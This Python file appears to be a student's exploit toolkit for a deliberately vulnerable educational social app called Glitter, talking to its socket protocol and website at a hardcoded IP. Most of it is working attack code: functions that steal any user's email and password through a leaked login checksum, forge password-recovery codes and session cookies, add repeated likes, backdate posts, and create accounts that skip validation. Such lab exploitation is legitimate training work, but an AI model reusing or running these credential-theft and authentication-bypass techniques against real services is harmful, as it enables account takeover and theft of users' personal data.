import hashlib
import socket
import json
from datetime import datetime as date
import random
import string
import requests

APP_IP = "54.187.16.171"
APP_PORT = 1336
USER_INFO = ""
WEB_URL = "http://cyber.glitter.org.il"

def checksum_calc(checksum_str):
    """
    This function calc the checksum by combine the ascii value of every letter in the name + password
    :param checksum_str: the name and password together (no spaces)
    :type checksum_str: str
    :return: the check sum
    :rtype: int
    """
    checksum_value = 0
    for letter in checksum_str:
        checksum_value += ord(letter)

    return checksum_value

def app_login(user_name, password, sock):
    """
    This function login to the app in the socket by the name and password that has been provide.
    :param user_name: the user name of the account
    :param password: the password of the account
    :param sock: the socket with the app
    :type user_name: str
    :type password: str
    :type sock: socket
    :return: the account info (if there)
    :rtype: str
    """
    global USER_INFO
    try:
        login_msg = ('100#{gli&&er}{"user_name":"' + user_name + '", "password":"' + password + '", "enable_push_notifications":true}##').encode()
        sock.sendall(login_msg)
        sock.recv(1024) # recv the login msg
        checksum = checksum_calc(f"{user_name}{password}")
        login_msg = (f'110#{{gli&&er}}{checksum}##').encode()
        sock.sendall(login_msg)
        res = sock.recv(1024).decode()
        if "approved" in res:
            res = res.replace("115#Authentication approved{gli&&er}", "").replace("##", "")
            res = json.loads(res)
            USER_INFO = res
            return res
        else:
            print("Can't login to the app :(, Please check your login details and try again.")
    except Exception as e:
        print(f"Error while make a login! - {e}")


def open_socket_connection():
    """
    This function create a socket and return it
    :return: the socket
    :type: socket connection
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((APP_IP, APP_PORT))

    return sock

def steal_email(sock, user_screen_name):
    """
    This function perform to steal users email
    :param sock: the socket connection with the app
    :param user_screen_name: the user name to get his email
    :type sock: socket
    :type user_screen_name: str
    :return: the emails
    :rtype: str
    """
    
    try:
        msg = (f'300#{{gli&&er}}{{"search_type":"SIMPLE", "search_entry":"{user_screen_name}"}}##').encode()
        sock.sendall(msg)
    except Exception as e:
        return (f"Error while try to steal a email -> {e}")
    res = sock.recv(1024).decode()
    emails_found = ""
    res = res.replace("305#Entities search result{gli&&er}", "").replace("##", "")
    i = 0 # The counter
    for x in json.loads(res):
        if x['mail'] not in emails_found and x['screen_name'] not in emails_found:
            i += 1
            emails_found += f"{i}. Username: {x['screen_name']}, E-Mail: {x['mail']}\n"
    
    return emails_found # Return the emails that were found


def steal_password(user_name):  
    """
    This function preform a password stealing by fake a login with a wrong password and the application return the error message with the needed checksum to make a login.
    And then I take this checksum and use it as the checksum that needed for the login, and then the application return a message where the user's password is in it.
    :param user_name: the name of the user to steal his password
    :type user_name: str
    :return: the password / None
    :rtype: str
    """
    
    sock = open_socket_connection()
    fake_password = "XXXXX"
    fake_msg =  ('100#{gli&&er}{"user_name":"' + user_name + '", "password":"' + fake_password + '", "enable_push_notifications":true}##').encode()
    sock.sendall(fake_msg)
    try:
        ascii_pass = sock.recv(1024).decode() # Get the ascii password that has been send from the application
        ascii_pass = ascii_pass.split("{gli&&er}") # Split the server msg to be easier to get the ascii passwords
        ascii_pass = int(ascii_pass[0].split("checksum: ")[1]) # Remove the other texts to get only the ascii password
        ascii_checksum = (f'110#{{gli&&er}}{str(ascii_pass)}##').encode()
        ascii_pass -= checksum_calc(user_name) # Remove the name checksum from the msg checksum to be the password only
        fake_password = chr(ascii_pass)
        fake_msg =  ('100#{gli&&er}{"user_name":"' + user_name + '", "password":"' + fake_password + '", "enable_push_notifications":true}##').encode()
        sock.sendall(fake_msg)
        ascii_pass = sock.recv(1024).decode() 
        sock.sendall(ascii_checksum)
        ascii_pass = sock.recv(1024).decode() 
        auth_msg = ascii_pass.replace("115#Authentication approved{gli&&er}", "").replace("##", "")
        auth_msg = json.loads(auth_msg)
        if auth_msg['password']:
            sock.close() # Closing the socket connection
            return auth_msg['password'] # return the password that has been send from the server
        else:
            sock.close() # Closing the socket connection
            return None # Return nothing, the password not found
    except Exception as e:
        sock.close() # Closing the socket connection
        return None # Return nothing, the password not found

    


def add_likes_to_glit(sock, user_screen_name, owner_id):
    """
    This function perform to add more than one like to a specific glit
    :param sock: the socket connection with the application
    :return: none
    """

    glit_id = print_glits(sock, owner_id, user_screen_name)
    if glit_id != 1:
        like_msg = f"710#{{gli&&er}}{{\"glit_id\":{glit_id},\"user_id\":{owner_id},\"user_screen_name\":\"{user_screen_name}\",\"id\":-1}}##"
        sock.sendall(like_msg.encode())
        sock.sendall(like_msg.encode())
        sock.recv(1024)
        sock.sendall(like_msg.encode())
        sock.recv(1024) # Add more than one like to show that this is possible (3 Times)
        return 0
    else:
        return 1 # present an error

    

def print_glits(sock, owner_id, screen_name):
    """
    This function print the glits that in the profile of the owner_id, and return the id of the glit to add likes to it.
    :param sock: the socket connection with the application
    :param owner_id: the owner id of the user to print his glits
    :type sock: <socket>
    :type owner_id: int
    :return: the glit id / 1 - not found
    :rtype: int
    """
    end_date = str(date.utcnow()).replace(" ", "T")
    end_date = end_date[0:23]
    end_date = end_date + "Z"
    feed_update_req_msg = f"440#{{gli&&er}}{owner_id}##"
    sock.sendall(feed_update_req_msg.encode())
    sock.recv(1024)
    glits_req_msg = f"500#{{gli&&er}}{{\"feed_owner_id\":{owner_id},\"end_date\":\"{end_date}\",\"glit_count\":1000}}##"
    sock.sendall(glits_req_msg.encode())
    glits = str(sock.recv(32768).decode()).replace("505#Feed loading approved{gli&&er}", "").replace("##","") # Set a big num of recv to get all the messages (very long)
    glits = json.loads(glits)
    i = 0
    glits_list = []
    print(f"\nGlits from {screen_name}:")
    for glit in glits['glits']: # Run on the glits in the message, print them and add every glit's id to the array.
        i += 1
        d = str(glit['date'][:10]).replace("-","/")
        print(f"{i}. \"{glit['content']}\" {d}")
        glits_list.append(glit['id'])

    if len(glits_list) == 0:
        print("No glits found :(")
    else: # Get the user choice
        user_choice = int(input("Please choose: "))
        while not(len(glits_list) >= user_choice > 0):
            print(f"You can only choose glit between 1-{len(glits_list)}")
            user_choice = int(input("Please choose: "))

        return glits_list[user_choice-1] # Return the id of the glits that the user chose

    return 1 # Means that we can't find any glits for the user
    

def post_glit_past(sock, owner_id):
    """
    This function perform to post a glit in the past (for example my date of birth:) )
    :param sock: the socket with the application
    :param owner_id: the owner id
    :type sock: socket
    :type owner_id: int
    :return: success or not
    :rtype: bool
    """
    past_date = "2006-01-05T01:23:45.67Z"
    post_msg = f"550#{{gli&&er}}{{\"feed_owner_id\":{owner_id}, \"publisher_id\":{owner_id}, \"publisher_screen_name\":\"Ido's Program\", \"publisher_avatar\":\"im2\",\"background_color\":\"Red\",\"date\":\"{past_date}\",\"content\":\"A past message :)\",\"font_color\":\"black\",\"id\":-1}}##"
    sock.sendall(post_msg.encode())
    res = sock.recv(1024).decode()
    if "approved" in res: # Check if the post was success
        return True
    else:
        return False


def post_glit_different_color(sock, owner_id):
    """
    This function perform to post a glit with a color that doesn't one of the color options.
    :param sock: the socket with the application
    :param owner_id: the owner id
    :type sock: socket
    :type owner_id: int
    :return: if the process success or not
    :rtype: bool
    """
    d_date = str(date.utcnow()).replace(" ", "T")
    d_date = d_date[0:23]
    d_date = d_date + "Z"
    color = "#"+''.join([random.choice('ABCDEF0123456789') for i in range(6)]) # Generate a random color that doesn't one of the options
    post_msg = f"550#{{gli&&er}}{{\"feed_owner_id\":{owner_id}, \"publisher_id\":{owner_id}, \"publisher_screen_name\":\"Ido's Program\", \"publisher_avatar\":\"im2\",\"background_color\":\"{color}\",\"date\":\"{d_date}\",\"content\":\"What that color is ???\",\"font_color\":\"black\",\"id\":-1}}##"
    sock.sendall(post_msg.encode())
    res = sock.recv(1024).decode()
    if "approved" in res: # Check if the post was success
        return True
    else:
        return False



def registration_code_lower_than_five():
    """
    This function create an account that his registration code is lower than the needed (5)
    :return: success or not
    :rtype: bool
    """
    content = ""
    for i in range(301):
        content += f"{i} "
    d_date = str(date.utcnow()).replace(" ", "T")
    d_date = d_date[0:23]
    d_date = d_date + "Z"
    sock = open_socket_connection()
    long_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    post_msg = f"150#{{gli&&er}}{{\"registration_code\":\"123\",\"user\":{{\"screen_name\":\"{long_name}\",\"avatar\":\"im2\",\"description\":\"ddddd\",\"privacy\":\"Public\",\"id\":-1,\"user_name\":\"{long_name}\",\"password\":\"123456\",\"gender\":\"Male\",\"mail\":\"idoo@ido.com\"}}}}##"
    sock.sendall(post_msg.encode())
    res = sock.recv(32768).decode()
    if "approved" in res: # Check if the post was success
        return True
    else:
        return False

def create_acc_screen_name_long():
    """
    This function create an account that his screen name is longer than the limit (30 chars I think)
    :return: success or not
    :rtype: bool
    """
    content = ""
    for i in range(301):
        content += f"{i} "
    d_date = str(date.utcnow()).replace(" ", "T")
    d_date = d_date[0:23]
    d_date = d_date + "Z"
    sock = open_socket_connection()
    long_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(100))
    post_msg = f"150#{{gli&&er}}{{\"registration_code\":\"123456\",\"user\":{{\"screen_name\":\"{long_name}\",\"avatar\":\"im2\",\"description\":\"ddddd\",\"privacy\":\"Public\",\"id\":-1,\"user_name\":\"{''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))}\",\"password\":\"123456\",\"gender\":\"Male\",\"mail\":\"idoo@ido.com\"}}}}##"
    sock.sendall(post_msg.encode())
    res = sock.recv(32768).decode()
    if "approved" in res: # Check if the post was success
        return True
    else:
        return False

def create_acc_name_long():
    """
    This function create an account that his name is longer than the limit (30 chars I think)
    :return: success or not
    :rtype: bool
    """
    content = ""
    for i in range(301):
        content += f"{i} "
    d_date = str(date.utcnow()).replace(" ", "T")
    d_date = d_date[0:23]
    d_date = d_date + "Z"
    sock = open_socket_connection()
    long_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(100))
    post_msg = f"150#{{gli&&er}}{{\"registration_code\":\"123456\",\"user\":{{\"screen_name\":\"Idoooo\",\"avatar\":\"im2\",\"description\":\"ddddd\",\"privacy\":\"Public\",\"id\":-1,\"user_name\":\"{long_name}\",\"password\":\"123456\",\"gender\":\"Male\",\"mail\":\"idoo@ido.com\"}}}}##"
    sock.sendall(post_msg.encode())
    res = sock.recv(32768).decode()
    if "approved" in res: # Check if the post was success
        return True
    else:
        return False


def post_comment_no_name(sock, owner_id):
    """
    This function will post a comment without any name
    :param sock: the socket connection with the application
    :param owner_id: the owner id
    :type sock: socket
    :type owner_id: int
    :return: success or not
    :rtype: bool
    """
    glit_id = print_glits(sock, owner_id, USER_INFO['screen_name'])
    d_date = str(date.utcnow()).replace(" ", "T")
    d_date = d_date[0:23]
    d_date = d_date + "Z"
    msg = f"650#{{gli&&er}}{{\"glit_id\":{glit_id},\"user_id\":{owner_id},\"user_screen_name\":\"\",\"id\":-1,\"content\":\"comment\",\"date\":\"{d_date}\"}}##"
    sock.sendall(msg.encode())
    res = sock.recv(1024).decode()
    if "approved" in res: # Check if the post was success
        return True
    else:
        return False

def get_history(user_id):
    """
    This function gets the user's search history
    :param user_id: the user's id
    :type user_id: int
    :return: the history
    :rtype: str
    """
    search_history = json.loads((requests.get(f"{WEB_URL}/history/{user_id}").text))
    results = []
    for search,i in zip(search_history, range(len(search_history))):
        results.append(f"{i+1}. \"{search['screen_name']}\"")
    
    if len(results) > 0:
        return results
    else:
        return "No search history."

def get_cookie():
    """
    This function perform to create the user's current cookie.
    :return: the cookie
    :rtype: str
    """
    return hashlib.md5(USER_INFO['user_name'].encode()).hexdigest() + date.now().strftime(".%H%M.%d%m%Y")

def get_password_by_name(user_name, id):
    """
    This function perform to steal a password the the username and id. The website edition!
    :param user_name: the user name
    :type user_name: str
    :return: the password / None
    :rtype: str / None
    """

    requests.post(f"{WEB_URL}/password-recovery-code-request", json=user_name) # Make the request to the recovery password
    code = date.now().strftime("%d%m?%H%M") # the "?" to replace it later
    code_str_part = ""
    for integer in str(id): # Calc the center code
        code_str_part += chr(65 + int(integer))
    code = code.replace("?", code_str_part)
    res = requests.post(f"{WEB_URL}/password-recovery-code-verification", json=[user_name, code])
    if res.text.startswith("\""):
        return res.text # Return the password
    else:
        return None
    
